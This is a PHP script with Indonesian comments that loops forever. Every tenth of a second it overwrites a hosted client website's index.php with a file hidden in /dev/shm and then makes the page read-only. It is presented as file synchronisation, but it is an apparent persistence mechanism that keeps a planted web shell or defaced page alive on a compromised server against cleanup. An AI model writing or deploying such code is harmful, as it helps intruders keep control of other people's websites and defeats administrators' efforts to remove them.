<?php
$sysfxp47 = "/var/www/clients/client3/web3/web/new/dokumen/index.php";
$doona = "/dev/shm/major.php";

function syncFiles($source, $target) {
    if (!file_exists($source) || (filesize($source) != filesize($target))) {
        // Mengubah hak akses file $source menjadi writable
        @chmod($source, 0644);
        
        // Menyalin isi file sumber $target ke file target $source
        if (copy($target, $source)) {
            echo "File berhasil disinkronkan.\n";
        } else {
            echo "Gagal menyalin file.\n";
        }
        
        // Mengatur file kembali menjadi read-only setelah penulisan selesai
        @chmod($source, 0444);
        
        // Periksa kembali file setelah disalin
        if (filesize($source) == filesize($target)) {
            echo "File yang disalin memiliki ukuran yang sama.\n";
        } else {
            echo "Perbedaan ukuran file setelah disalin.\n";
        }
    } else {
        echo "File sudah sama antara sumber dan target.\n";
    }
}

while (true) {
    echo "Checking file existence...\n";
    
    // Pengecekan dan sinkronisasi file
    syncFiles($sysfxp47, $doona);
    
    // Tunggu 0,1 detik sebelum memeriksa kembali
    usleep(100000); // 0,1 detik
}
?>
